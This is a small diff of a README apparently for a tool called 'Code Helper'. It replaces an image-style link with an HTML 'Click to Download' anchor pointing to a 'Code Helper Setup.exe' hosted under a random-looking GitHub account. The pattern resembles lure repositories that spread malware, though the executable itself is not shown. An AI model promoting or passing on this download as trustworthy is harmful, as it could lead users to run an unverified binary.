@@ -34,6 +34,6 @@ Rules:
       [2] It must be sort by a comma.
 
 ```
-![Download](https://github.com/pBsOycShSo/Code-Helper/blob/main/Code%20Helper%20Setup.exe)
+<a href="https://github.com/pBsOycShSo/Code-Helper/blob/main/Code%20Helper%20Setup.exe" download>Click to Download</a>
 
 ##  🤝 If you are interested in my works, follow for more.
